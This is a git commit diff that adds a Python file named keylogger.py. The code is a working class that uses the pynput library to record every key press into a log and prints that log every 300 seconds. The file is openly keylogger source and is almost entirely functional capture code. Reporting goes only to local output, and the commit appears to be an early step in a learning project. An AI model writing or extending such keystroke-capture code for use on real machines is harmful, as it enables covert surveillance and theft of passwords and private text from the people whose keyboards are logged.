645f3c0268f9c46e358f542e026023f33c21b890
Sergey Nazemtsev <42sdn@mail.ru>
2021-08-08 18:30:25 +0700

    Detect pressed buttons

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,29 @@
 import pynput.keyboard
+import threading
 
-keyboard_listener =
+log = ""
 
+
+class Keylogger:
+    def process_key_press(self, key):
+        global log
+        try:
+            log = log + str(key.char)
+        except AttributeError:
+            if key == key.space:
+                log = log + " "
+            else:
+                log = log + " " + str(key) + " "
+
+    def report(self):
+        global log
+        print(log)
+        log = ""
+        timer = threading.Timer(300, self.report)
+        timer.start()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
